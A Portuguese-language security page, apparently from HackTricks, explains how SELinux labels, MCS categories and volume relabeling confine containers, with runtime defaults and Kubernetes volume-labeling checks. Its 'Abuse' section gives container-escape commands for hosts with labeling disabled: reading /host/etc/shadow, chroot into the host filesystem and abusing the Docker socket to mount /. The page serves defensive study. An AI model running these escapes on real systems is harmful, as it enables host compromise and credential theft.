# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Visão geral

SELinux é um sistema de **Mandatory Access Control baseado em labels**. Cada processo e objeto relevante pode carregar um security context, e a policy decide quais domains podem interagir com quais types e de que maneira. Em ambientes containerizados, isso geralmente significa que o runtime inicia o processo do container dentro de um container domain confinado e aplica aos conteúdos do container os types correspondentes. Se a policy estiver funcionando corretamente, o processo poderá ler e gravar nos elementos que sua label deve acessar, enquanto terá o acesso negado a outros conteúdos do host, mesmo que esses conteúdos se tornem visíveis por meio de um mount.

Essa é uma das proteções mais poderosas do lado do host disponíveis nas principais implementações de containers em Linux. Ela é especialmente importante no Fedora, RHEL, CentOS Stream, OpenShift e em outros ecossistemas centrados no SELinux. Nesses ambientes, um revisor que ignora o SELinux frequentemente entenderá errado por que um caminho aparentemente óbvio para comprometer o host está, na realidade, bloqueado.

## AppArmor Vs SELinux

A diferença de alto nível mais fácil de entender é que o AppArmor é baseado em paths, enquanto o SELinux é **baseado em labels**. Isso tem grandes consequências para a segurança de containers. Uma policy baseada em paths pode se comportar de maneira diferente se o mesmo conteúdo do host se tornar visível sob um path de mount inesperado. Uma policy baseada em labels, por outro lado, verifica qual é a label do objeto e o que o process domain pode fazer com ele. Isso não torna o SELinux simples, mas o torna resistente a uma classe de suposições baseadas em truques com paths que defenders às vezes fazem acidentalmente em sistemas baseados em AppArmor.

Como o modelo é orientado a labels, o gerenciamento de volumes dos containers e as decisões de relabeling são críticos para a segurança. Se o runtime ou o operador alterar as labels de forma ampla demais para "fazer os mounts funcionarem", o limite da policy que deveria conter o workload poderá se tornar muito mais fraco do que o pretendido.

## Lab

Para verificar se o SELinux está ativo no host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Para inspecionar os rótulos existentes no host:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Para comparar uma execução normal com uma em que a rotulagem está desabilitada:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Em um host com SELinux habilitado, esta é uma demonstração muito prática porque mostra a diferença entre uma workload executando sob o domínio esperado de container e outra da qual essa camada de enforcement foi removida.

## Uso em Runtime

O Podman é particularmente bem alinhado ao SELinux em sistemas nos quais o SELinux faz parte do padrão da plataforma. Rootless Podman junto com SELinux é uma das baselines de container mainstream mais fortes, porque o processo já não tem privilégios no lado do host e ainda está confinado pela política MAC. O Docker também pode usar SELinux quando há suporte, embora administradores às vezes o desabilitem para contornar problemas de labeling de volumes. CRI-O e OpenShift dependem fortemente do SELinux como parte de sua estratégia de isolamento de containers. O Kubernetes também pode expor configurações relacionadas ao SELinux, mas seu valor obviamente depende de o sistema operacional do node realmente oferecer suporte e aplicar o SELinux.<sup>[[2]](#references)</sup>

A lição recorrente é que o SELinux não é um enfeite opcional. Nos ecossistemas desenvolvidos em torno dele, ele faz parte do security boundary esperado. Para enumeração de políticas no host, análise de transições e abuso de ferramentas de administração do SELinux, consulte a [página geral do SELinux](../../../interesting-files-permissions/selinux.md).

## Categorias MCS e Relabeling de Volumes

O isolamento de containers normalmente é uma combinação de **type enforcement** e **Multi-Category Security (MCS)**. Dois processos podem ser executados como `container_t`, mas receber níveis diferentes, como `s0:c123,c456` e `s0:c321,c654`. O conteúdo privado do container recebe o label `container_file_t` com as categorias correspondentes, portanto simplesmente alcançar o path de outro container não é suficiente para acessá-lo. Os runtimes normalmente alocam o par de categorias; reutilizar manualmente um nível colapsa deliberadamente essa separação por container.<sup>[[3]](#references)</sup>

Compare os labels dos processos e dos mounts em vez de verificar apenas o tipo:<sup>[[3]](#references)</sup>
```bash
podman inspect --format 'process={{.ProcessLabel}} mount={{.MountLabel}}' <container>
podman top <container> label
ps -eZ | grep -E 'container_t|spc_t'
ls -Zd /path/to/bind-mount
```
Os sufixos de bind-mount alteram os rótulos de inode do host e, portanto, alteram o limite de segurança, não apenas os metadados do mount:<sup>[[3]](#references)</sup>

- `:Z` aplica um rótulo privado com as categorias MCS do container. É apropriado para um volume pertencente a um único container ou Pod.
- `:z` aplica um rótulo compartilhado para que outros containers confinados também possam usar o conteúdo (sujeito às permissões de DAC). Usá-lo para secrets ou dados específicos de um tenant remove o isolamento MCS que, de outra forma, separaria os containers.
- O relabeling é recursivo. Aplicar qualquer uma das opções a árvores amplas do host, como `/`, `/etc`, `/usr` ou uma árvore home inteira, pode tanto expor o conteúdo ao container selecionado quanto interromper serviços do host cujos rótulos esperados foram substituídos.

A reutilização manual de níveis é fácil de identificar em command lines e manifests. Os dois containers a seguir recebem intencionalmente o mesmo nível MCS e, portanto, podem usar conteúdo rotulado para esse nível:<sup>[[3]](#references)</sup>
```bash
podman run --security-opt label=level:s0:c100,c200 ...
podman run --security-opt label=level:s0:c100,c200 ...
```
Também distinga `label=nested` de `label=disable`: o primeiro expõe operações do SELinux dentro do container e permite alterações de label somente onde a policy permitir, enquanto o segundo remove a separação de labels para essa workload. Ambos merecem revisão, mas não são equivalentes.<sup>[[3]](#references)</sup>

## Misconfigurations

O erro clássico é `label=disable`. Operacionalmente, isso geralmente acontece porque um volume mount foi negado e a resposta imediata mais rápida foi remover o SELinux da equação, em vez de corrigir o modelo de labeling.<sup>[[1]](#references)</sup> Outro erro comum é o relabeling incorreto de conteúdo do host. Operações amplas de relabeling podem fazer a aplicação funcionar, mas também podem ampliar muito o que o container pode acessar, para além do que foi originalmente pretendido.

Também é importante não confundir SELinux **instalado** com SELinux **efetivo**. Um host pode oferecer suporte ao SELinux e ainda estar em modo permissive, ou o runtime pode não estar iniciando a workload no domain esperado. Nesses casos, a proteção é muito mais fraca do que a documentação pode sugerir.

## Abuse

Quando o SELinux está ausente, em modo permissive ou amplamente desabilitado para a workload, os caminhos montados do host se tornam muito mais fáceis de abusar. O mesmo bind mount que, de outra forma, seria restringido por labels pode se tornar uma via direta para acessar dados do host ou modificá-lo. Isso é especialmente relevante quando combinado com writable volume mounts, diretórios do container runtime ou atalhos operacionais que expõem caminhos sensíveis do host por conveniência.

O SELinux geralmente explica por que um writeup genérico de breakout funciona imediatamente em um host, mas falha repetidamente em outro, mesmo que as flags do runtime pareçam semelhantes. O ingrediente ausente frequentemente não é um namespace nem uma capability, mas uma fronteira de labels que permaneceu intacta.

A verificação prática mais rápida é comparar o context ativo e, em seguida, testar os caminhos montados do host ou os diretórios do runtime que normalmente estariam confinados por labels:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Se uma montagem bind do host estiver presente e a rotulagem do SELinux tiver sido desativada ou enfraquecida, a divulgação de informações geralmente vem primeiro:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Se o mount for gravável e o container for efetivamente root no host do ponto de vista do kernel, o próximo passo é testar uma modificação controlada no host em vez de fazer suposições:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Em hosts com suporte a SELinux, a perda de labels em diretórios de estado de runtime também pode expor caminhos diretos para privilege escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Esses comandos não substituem uma cadeia completa de escape, mas deixam claro rapidamente se o SELinux era o que estava impedindo o acesso aos dados do host ou a modificação de arquivos no host.

### Exemplo completo: SELinux desativado + montagem gravável do host

Se a rotulagem do SELinux estiver desativada e o filesystem do host estiver montado com permissão de escrita em `/host`, um escape completo do host se torna um caso comum de abuso de bind-mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Se o `chroot` for bem-sucedido, o processo do container agora estará operando a partir do sistema de arquivos do host:
```bash
id
hostname
cat /etc/passwd | tail
```
### Exemplo completo: SELinux desabilitado + diretório de runtime

Se o workload puder alcançar um socket de runtime quando os labels estiverem desabilitados, o escape poderá ser delegado ao runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
A observação relevante é que o SELinux frequentemente era o controle que impedia exatamente esse tipo de acesso a caminhos do host ou ao estado de runtime.

## Verificações

O objetivo das verificações do SELinux é confirmar que o SELinux está habilitado, identificar o contexto de segurança atual e verificar se os arquivos ou caminhos relevantes estão realmente confinados por rótulos.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
O que é interessante aqui:

- `getenforce` deve idealmente retornar `Enforcing`; `Permissive` ou `Disabled` altera o significado de toda a seção sobre SELinux.
- Se o contexto do processo atual parecer inesperado ou amplo demais, o workload pode não estar sendo executado sob a policy de container pretendida.
- Se arquivos montados a partir do host ou diretórios de runtime tiverem labels que o processo pode acessar livremente demais, bind mounts se tornam muito mais perigosos.

Ao revisar um container em uma plataforma compatível com SELinux, não trate o labeling como um detalhe secundário. Em muitos casos, ele é uma das principais razões pelas quais o host ainda não foi comprometido.

## Runtime Defaults

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Depende do host | A separação do SELinux está disponível em hosts com SELinux habilitado, mas o comportamento exato depende da configuração do host/daemon | `--security-opt label=disable`, relabeling amplo de bind mounts, `--privileged` |
| Podman | Normalmente habilitado em hosts com SELinux | A separação do SELinux é uma parte normal do Podman em sistemas com SELinux, a menos que seja desabilitada | `--security-opt label=disable`, `label=false` em `containers.conf`, `--privileged` |
| Kubernetes | Atribuído pelo runtime em nodes com SELinux; configurável explicitamente | O runtime pode alocar um label exclusivo quando o Pod não define um. `securityContext.seLinuxOptions` explícito controla o label do Pod/volume; no Kubernetes 1.37, volumes elegíveis usam labeling de mount do SELinux por padrão | níveis MCS duplicados, nodes permissivos/desabilitados, workloads privilegiados amplos, `seLinuxChangePolicy: Recursive` indiscriminado <sup>[[2]](#references)[[4]](#references)</sup> |
| CRI-O / deployments no estilo OpenShift | Normalmente muito utilizado | O SELinux costuma ser uma parte central do modelo de isolamento do node nesses ambientes | policies customizadas que ampliam o acesso excessivamente, desabilitação do labeling por compatibilidade |

Os padrões do SELinux dependem mais da distribuição do que os padrões do seccomp. Em sistemas no estilo Fedora/RHEL/OpenShift, o SELinux costuma ser central para o modelo de isolamento. Em sistemas sem SELinux, ele simplesmente não existe.

## Kubernetes 1.37 Volume Labeling

O Kubernetes 1.37 tornou o `SELinuxMount` estável e o habilitou por padrão. Para um PVC elegível, um Pod com `seLinuxOptions` e um CSI driver que anuncia `.spec.seLinuxMount: true`, o kubelet usa `-o context=<label>` em vez de solicitar ao runtime que faça o relabeling recursivo de cada inode. Drivers e tipos de volume incompatíveis ainda usam o caminho recursivo. Isso evita uma grande operação de relabeling e também evita alterar os labels persistentes de todos os arquivos apenas para expor o volume a um Pod.<sup>[[2]](#references)[[4]](#references)</sup>

Um mount pode carregar apenas um contexto desse tipo. Consequentemente, Pods com **labels SELinux diferentes** que usam o mesmo volume elegível no mesmo node não coexistem mais sob o comportamento padrão de `MountOption`: um deles permanece em `ContainerCreating` com um erro `conflicting SELinux labels of volume`. Trate isso tanto como um problema de disponibilidade quanto como uma indicação útil de que os workloads estavam compartilhando storage implicitamente entre limites MCS. Se esse compartilhamento for intencional — por exemplo, um Pod privilegiado `spc_t` e um Pod confinado usando o mesmo volume — o escape hatch de compatibilidade por Pod é `seLinuxChangePolicy: Recursive`; não o aplique em todo o cluster sem entender quais paths o runtime irá relabelar.<sup>[[2]](#references)[[4]](#references)</sup>
```yaml
spec:
securityContext:
seLinuxOptions:
level: "s0:c123,c456"
seLinuxChangePolicy: Recursive
```
Verificações úteis do lado do cluster:<sup>[[2]](#references)</sup>
```bash
# Drivers that opt in to -o context= volume mounts
kubectl get csidriver -o custom-columns=NAME:.metadata.name,SELINUX_MOUNT:.spec.seLinuxMount

# Explicit levels or recursive-policy exceptions
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.securityContext.seLinuxOptions or
.spec.securityContext.seLinuxChangePolicy) |
[.metadata.namespace,.metadata.name,
(.spec.securityContext.seLinuxOptions.level // "-"),
(.spec.securityContext.seLinuxChangePolicy // "MountOption")] | @tsv'

# Start failures and warnings caused by incompatible labels
kubectl get events -A --sort-by=.lastTimestamp |
grep -Ei 'SELinux|conflicting SELinux labels'
```
O `selinux-warning-controller` opcional do kube-controller-manager detecta Pods que compartilham um volume com labels incompatíveis e expõe a métrica `selinux_warning_controller_selinux_volume_conflict`. Habilite-o e revise-o antes de upgrades ou antes de alterar o comportamento de labels de volumes; ele ajuda a distinguir um conflito genuíno de policy de uma falha comum de CSI ou do sistema de arquivos.<sup>[[2]](#references)</sup>

## References

- [1] [Documentação do Podman: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Configurar um Security Context para um Pod ou Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [3] [Documentação do podman run: labels do SELinux e relabeling de volumes](https://docs.podman.io/en/latest/markdown/podman-run.1.html)
- [4] [Release do Kubernetes v1.37: SELinuxMount e SELinuxChangePolicy](https://kubernetes.io/blog/2026/08/26/kubernetes-v1-37-release/)
{{#include ../../../../banners/hacktricks-training.md}}
